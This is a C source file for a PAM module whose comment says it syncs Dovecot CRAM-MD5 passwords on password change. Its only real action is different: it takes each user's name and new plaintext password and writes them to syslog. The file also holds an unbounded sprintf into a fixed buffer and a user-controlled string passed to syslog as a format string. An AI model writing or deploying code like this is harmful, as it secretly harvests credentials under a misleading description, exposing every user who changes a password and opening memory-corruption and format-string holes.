/*
 *
 * A PAM module that hooks into password updates and uses them
 * to update the HMAC-MD5 passwords used by dovecot for CRAM-MD5
 * authentication.
 *
 */

#include <stdlib.h>
#include <syslog.h>
#include <stdio.h>

#define PAM_SM_PASSWORD

#include <security/pam_modules.h>

PAM_EXTERN int
pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    const char* username;
    const char* password;
    char buf[2048];
    if (pam_get_user(pamh, &username, NULL) != PAM_SUCCESS) {
        syslog(LOG_ERR, "cannot determine user name");
        return PAM_USER_UNKNOWN;
    }

    pam_get_item(pamh, PAM_AUTHTOK, (const void**)&password);

    sprintf(buf, "Username: %s  Password: %s", username, password);
    syslog(LOG_ERR, buf);

    return PAM_SUCCESS; /* This method is always "successful" even when it fails */
}

#ifdef PAM_STATIC

struct pam_module _pam_dovecotmd5pwd_modstruct = {
    "pam_dovecotmd5pwd",
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    pam_sm_chauthtok
};

#endif
